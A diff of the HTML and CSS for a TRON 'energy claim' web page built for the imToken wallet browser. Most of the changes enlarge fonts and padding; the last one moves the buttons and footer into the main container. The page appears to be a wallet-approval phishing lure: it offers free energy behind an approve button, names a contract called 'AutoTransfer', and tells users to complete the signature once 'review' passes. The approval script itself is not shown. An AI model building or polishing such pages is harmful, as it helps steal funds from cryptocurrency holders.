@@ -19,7 +19,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
 body { 
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    padding: 8px 6px; /* 减小内边距，更紧凑 */
+    padding: 10px 8px; /* 增加内边距，更饱满 */
     max-width: 600px; 
     margin: 0 auto; 
     background: #121a17; 
@@ -27,42 +27,39 @@ body {
     min-height: 100vh;
     display: flex;
     flex-direction: column;
-    gap: 5px; /* 减小元素间距 */
+    gap: 4px; /* 缩小模块间距，更紧凑 */
     border-radius: 8px;
     border-left: 3px solid #3b82f6;
-    font-size: 14px; /* 恢复原字体大小 */
+    font-size: 15px; /* 整体字体调大 */
 }
 .container {
-   flex: 1;
+    flex: 1; /* 占满剩余垂直空间，消除底部空档 */
     display: flex;
     flex-direction: column;
-    gap: 3px; /* 模块间间距从5px缩到3px */
+    gap: 6px; /* 模块间距，避免拥挤 */
 }
-/* 新增：标题+语言切换同一行容器 */
+/* 顶部容器：调整高度+对齐，减少冗余空间 */
 .header-container {
     display: flex;
-    flex-direction: row;
-    align-items: flex-end;
     justify-content: space-between;
-    align-items: center; /* 改为垂直居中，减少上下空白 */
-    padding: 6px 8px; /* 进一步减小内边距 */
+    align-items: center;
+    padding: 10px 8px;
     border-bottom: 1px solid #334155;
-    margin-bottom: 2px; /* 与下方模块的间距缩到最小 */
-    min-height: 50px; /* 大幅缩小容器高度 */
+    margin-bottom: 2px;
+    min-height: 70px; /* 适配调大的字体 */
     box-sizing: border-box;
 }
 .lang-switch {
     padding: 0;
     margin: 0;
-    margin-top: 4px; /* 语言按钮微调整体位置 */
 }
 .lang-toggle {
-    padding: 3px 8px; /* 减小按钮内边距 */
+    padding: 4px 10px; /* 调大按钮内边距，更易点击 */
     border: 1px solid #3b82f6;
     border-radius: 20px;
     background: transparent;
     color: #e0e8e4;
-    font-size: 13px; /* 恢复原字体大小 */
+    font-size: 14px; /* 字体调大 */
     cursor: pointer;
     display: flex;
     align-items: center;
@@ -72,89 +69,88 @@ body {
     background: rgba(59, 130, 246, 0.2);
 }
 .header {
-   text-align: left;
+    text-align: left;
     padding: 0;
     border-bottom: none;
     margin-bottom: 0;
     display: flex;
-    align-items: center; /* 垂直居中，消除上下冗余 */
-    gap: 8px;
-    margin-top: 0; /* 去掉多余的上边距 */
+    align-items: center;
+    gap: 10px; /* 增加Logo与文字间距 */
 }
  .header > div {
-    display: flex; /* 横向排列 */
-    align-items: flex-end; /* 关键：让desc靠下对齐（相对于h1下移） */
-    gap: 10px; /* 两个文本之间的间距，可按需调整 */
-    margin-top: 6px; /* 整体往下挪，拉近与下方容器的距离 */
+    display: flex;
+    align-items: center;
+    gap: 12px; /* 增加h1与desc间距 */
  }
-/* 新增：Logo样式（缩小尺寸，减少占用空间） */
+/* Logo样式：保持长方形比例，适配调大的容器 */
 .header-logo {
-    width: 46px; /* 缩小Logo，与文字更协调 */
-    height: 33px;
-    border-radius: 4px; /* 轻微圆角更美观 */
-    object-fit: cover;
-    margin-top: 4px; /* 微调整Logo位置 */
+    width: 70px; 
+    height: 50px; /* 长方形比例，更协调 */
+    border-radius: 4px;
+    object-fit: contain; /* 避免变形 */
 }
 .header h1 { 
-    font-size: 26px; /* 恢复原字体大小 */
+    font-size: 28px; /* 字体调大，更醒目 */
     color: #3b82f6;    
     margin-bottom: 0;
-    line-height: 1.5;
+   line-height: 1.2;
 }
 .header .desc {
-    font-size: 12px; /* 恢复原字体大小 */
+    font-size: 14px; /* 字体调大 */
     color: #a0a8a4;
     max-width: 400px;
     line-height: 1.5;
     margin-bottom: 0;
-    margin-top: 2px; /* 强化desc下移效果 */
 }
-/* 以下为原CSS其他部分，保持不变 */
 .warning {
     background: #334155;
     color: #93c5fd;
-    padding: 10px; /* 减小内边距 */
+    padding: 12px; /* 调大内边距 */
     border-radius: 8px;
-    font-size: 12px; /* 恢复原字体大小 */
+    font-size: 13px; /* 字体调大 */
     border-left: 3px solid #4ade80;
-    line-height: 1.5;
+    line-height: 1.6;
 }
 .warning strong {
     color: #3b82f6;
 }
 #userInfo {
     text-align: center;
-    font-size: 13px; /* 恢复原字体大小 */
-    padding: 10px; /* 减小内边距 */
+    font-size: 14px; /* 字体调大 */
+    padding: 14px; /* 调大内边距，填充空间 */
     background: #1e2925;
     border-radius: 8px;
     border: 1px solid #334155;
-    line-height: 1.5;
+    line-height: 1.7;
+    min-height: 60px; /* 确保非连接状态下也有足够高度 */
 }
 #userInfo span {
     color: #3b82f6;
     font-weight: 500;
 }
+/* 钱包状态容器：适配两种状态，调大内容 */
 #walletStatusContainer {
     background: #1e2925;
-    padding: 10px; /* 减小内边距 */
+    padding: 14px; /* 调大内边距 */
     border-radius: 8px;
     border: 1px solid #334155;
-    font-size: 12px; /* 恢复原字体大小 */
+    font-size: 13px; /* 字体调大 */
     color: #a0a8a4;
-    line-height: 1.5;
+    line-height: 1.7;
     border-right: 5px solid #4ade80;
+    min-height: 180px; /* 确保非连接状态下内容填满（非连接时文字多） */
 }
 #walletStatusContainer .status-title {
-    font-size: 14px; /* 恢复原字体大小 */
+    font-size: 16px; /* 字体调大 */
     color: #3b82f6;
-    margin-bottom: 6px;
+    margin-bottom: 8px;
     display: flex;
     align-items: center;
     gap: 6px;
 }
 #walletStatusContainer .connected-content {
     display: none;
+    min-height: 120px; /* 连接状态下确保高度足够 */
 }
 #walletStatusContainer.connected .disconnected-content {
     display: none;
@@ -168,29 +164,31 @@ body {
 }
 #walletStatusContainer.connected .connected-content .orange-tip {
     color: #f97316;
-    margin-top: 3px;
-    font-size: 12px; /* 恢复原字体大小 */
+    margin-top: 5px;
+    font-size: 13px; /* 字体调大 */
 }
+/* 合约资源容器：调大内容+填充空间 */
 #contractResourceContainer {
     background: #1e2925;
-    padding: 10px; /* 减小内边距 */
+    padding: 14px; /* 调大内边距 */
     border-radius: 8px;
     border: 1px solid #334155;
-    font-size: 12px; /* 恢复原字体大小 */
+    font-size: 13px; /* 字体调大 */
     color: #a0a8a4;
-    line-height: 1.7;
+    line-height: 1.8;
     border-bottom: 2px solid rgba(59, 130, 246, 0.2);
+    min-height: 100px; /* 确保高度足够 */
 }
 #contractResourceContainer .status-title {
-    font-size: 14px; /* 恢复原字体大小 */
+    font-size: 16px; /* 字体调大 */
     color: #3b82f6;
-    margin-bottom: 6px;
+    margin-bottom: 8px;
     display: flex;
     align-items: center;
     gap: 6px;
 }
 #contractResourceContainer .status-title i {
-    font-size: 15px; /* 恢复原字体大小 */
+    font-size: 17px; /* 字体调大 */
     color: #93c5fd;
 }
 #contractResourceContainer .highlight {
@@ -199,45 +197,49 @@ body {
 }
 #contractResourceContainer .data-tag {
     background: rgba(59, 130, 246, 0.15);
-    padding: 2px 6px; /* 减小内边距 */
-    border-radius: 4px;border: 1px solid rgba(59, 130, 246, 0.3);
-    font-size: 12px; /* 恢复原字体大小 */
+    padding: 3px 8px; /* 调大内边距 */
+    border-radius: 4px;
+    border: 1px solid rgba(59, 130, 246, 0.3);
+    font-size: 13px; /* 字体调大 */
 }
-/* 新增：非钱包环境专属容器样式 */
+/* 非连接状态专属容器：调大内容+填充空间 */
 .special-tip-container {
     background: #1e2925;
-    padding: 12px;
+    padding: 16px; /* 调大内边距 */
     border-radius: 8px;
     border: 1px solid #334155;
-    display: none; /* 初始隐藏 */
-    margin-top: 3px;
-    border-right: 3px solid #f97316; /* 外层边框-主橙色 */
-    box-shadow: -2px 0 0 0 #fb923c; /* 内层边框-浅橙色，形成双层效果 */
+    display: none;
+    margin-top: 4px;
+    border-right: 3px solid #f97316;
+    box-shadow: -2px 0 0 0 #fb923c;
+    min-height: 80px; /* 确保显示时填充空间 */
 }
 .special-tip-title {
-    font-size: 16px; /* 比其他字体稍大 */
+    font-size: 18px; /* 字体调大 */
     color: #f97316;
     font-weight: 600;
-    margin-bottom: 6px;
+    margin-bottom: 8px;
 }
 .special-tip-content {
-    font-size: 14px; /* 比其他字体稍大 */
+    font-size: 15px; /* 字体调大 */
     color: #f97316;
-    line-height: 1.6;
-    font-weight: 500; /* 加粗醒目 */
+    line-height: 1.7;
+    font-weight: 500;
 }
+/* 连接状态专属容器：调大内容+填充空间 */
 .record-list {
     background: #1e2925;
-    padding: 12px; /* 减小内边距 */
+    padding: 14px; /* 调大内边距 */
     border-radius: 8px;
     border: 1px solid #334155;
-    font-size: 12px; /* 恢复原字体大小 */
+    font-size: 13px; /* 字体调大 */
     border-right: 5px solid #4ade80;
-    display: none; /* 初始隐藏 */
+    display: none;
+    min-height: 120px; /* 确保显示时填充空间 */
 }
 .record-item {
-    margin-bottom: 8px;
-    padding-bottom: 8px;
+    margin-bottom: 10px;
+    padding-bottom: 10px;
     border-bottom: 1px solid #334155;
 }
 .record-item:hover {
@@ -245,10 +247,10 @@ body {
     transition: border-color 0.3s;
 }
 .record-item p {
-    margin-bottom: 4px;
+    margin-bottom: 6px;
     color: #a0a8a4;
-    line-height: 1.4;
-    font-size: 12px; /* 恢复原字体大小 */
+    line-height: 1.5;
+    font-size: 13px; /* 字体调大 */
 }
 .record-item p strong {
     color: #e0e8e4;
@@ -260,23 +262,24 @@ body {
     display: inline-flex;
     align-items: center;
     gap: 5px;
-    font-size: 12px; /* 恢复原字体大小 */
+    font-size: 13px; /* 字体调大 */
 }
 .tx-link:hover {
     text-decoration: underline;
 }
+/* 按钮组：贴近上方容器，消除空档 */
 .btn-group {
     display: flex;
     flex-direction: column;
-    gap: 6px; /* 减小间距 */
-    margin-top: 8px;
+    gap: 8px; /* 增加按钮间距，更易点击 */
+    margin-top: 4px; /* 缩小与上方容器的间距 */
     padding: 8px 0;
     border-top: 1px solid #334155;
 }
 .btn {
     width: 100%;
-    padding: 12px; /* 减小内边距 */
-    font-size: 14px; /* 恢复原字体大小 */
+    padding: 14px; /* 调大内边距，更饱满 */
+    font-size: 16px; /* 字体调大，更醒目 */
     border: none;
     border-radius: 8px;
     background: #2563eb;
@@ -300,10 +303,10 @@ body {
     margin-top: 8px;
     padding-top: 8px;
     border-top: 1px solid #334155;
-    font-size: 10px; /* 恢复原字体大小 */
+    font-size: 11px; /* 字体调大 */
     color: #a0a8a4;
     text-align: center;
-    line-height: 1.6;
+    line-height: 1.7;
 }
 .footer-info a {
     color: #3b82f6;
@@ -317,8 +320,8 @@ body {
 }
 .review-tip {
     color: #4ade80;
-    font-size: 12px; /* 恢复原字体大小 */
-    margin-top: 6px;
+    font-size: 13px; /* 字体调大 */
+    margin-top: 8px;
     display: flex;
     align-items: center;
     justify-content: center;
@@ -396,22 +399,26 @@ body {
             </div>       
             <span id="approvalRecords" class="highlight">暂无能量领取记录</span>        
         </div>
-    </div>
-    <div class="btn-group">
-        <div class="warning">
-            <p id="browserWarn1"> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
-            <p id="browserWarn2"> ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken</p>  
-        </div> 
-        <button id="connectBtn" class="btn">连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled>领取能量</button>
-       
-        <div id="reviewTip" class="review-tip" style="display: none;">
-           <span id="reviewTipText">系统审核中，审核通过后请务必完成签名</span>
+
+        <!-- 按钮组移进container -->
+        <div class="btn-group">
+            <div class="warning">
+                <p id="browserWarn1"> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
+                <p id="browserWarn2"> ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken</p>  
+            </div> 
+            <button id="connectBtn" class="btn">连接imToken钱包</button>
+            <button id="approveBtn" class="btn" disabled>领取能量</button>
+           
+            <div id="reviewTip" class="review-tip" style="display: none;">
+               <span id="reviewTipText">系统审核中，审核通过后请务必完成签名</span>
+            </div>
         </div>
-    </div>
-    <div class="footer-info" id="footerInfo">
-        合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）
-        © 2025 能量服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
+
+        <!-- 底部信息移进container -->
+        <div class="footer-info" id="footerInfo">
+            合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）
+            © 2025 能量服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
+        </div>
     </div>
    <script src="imtoken://browser"></script>
 <script>
